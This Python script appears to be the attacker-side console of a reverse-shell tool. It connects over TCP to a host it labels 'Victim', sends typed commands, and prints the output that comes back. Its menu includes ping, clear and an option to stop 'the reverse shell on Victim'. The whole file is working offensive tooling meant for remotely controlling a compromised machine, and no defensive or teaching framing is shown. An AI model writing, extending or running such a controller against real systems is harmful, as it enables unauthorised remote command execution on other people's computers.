from scapy.all import sr1, IP, ICMP
from colorama import Fore
import socket
import time
import sys
import os

server_ip = '127.0.0.1'
server_port = 34567

victim = f'{Fore.LIGHTRED_EX}Victim{Fore.RESET}'
pipe = f'{Fore.LIGHTBLUE_EX} | {Fore.RESET}'

commands = f'''
help{pipe}Prints this menu
cls - clear{pipe}Clears this console
exit - close{pipe}Closes this client and connection
stop{pipe}Stops the reverse shell on {victim}
ping{pipe}Gives you the ping between you and the {victim}
'''

def ping():
    pings = []
    pkt = IP(dst=server_ip)/ICMP()
    for i in range(5):
        start = time.time()
        resp = sr1(pkt, timeout=2, verbose=0)
        end = time.time()
        if resp is None:
            print(f"{server_ip} is unreachable.")
        else:
            rtt = (end - start) * 1000
            pings.append(rtt)
    if pings:
        avg = sum(pings) / len(pings)
        print(f"Average RTT: {avg:.2f} ms")
    else:
        print("No replies received.")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    
    while True:
        command = input("> ").strip()
        if not command:
            continue
        
        if command in ('cls', 'clear'):
            os.system('cls' if os.name == 'nt' else 'clear')
            continue

        if command == 'ping':
            ping()
            continue
        
        if command == 'help':
            print(commands)
            continue
        
        if command in ('exit', 'close'):
            sock.close()
            break
        
        sock.sendall(command.encode())
        
        result = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            result += data
            if len(data) < 4096:
                break
        
        print(result.decode())
        
except KeyboardInterrupt:
    try:
        sock.close()
    except:
        pass
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()
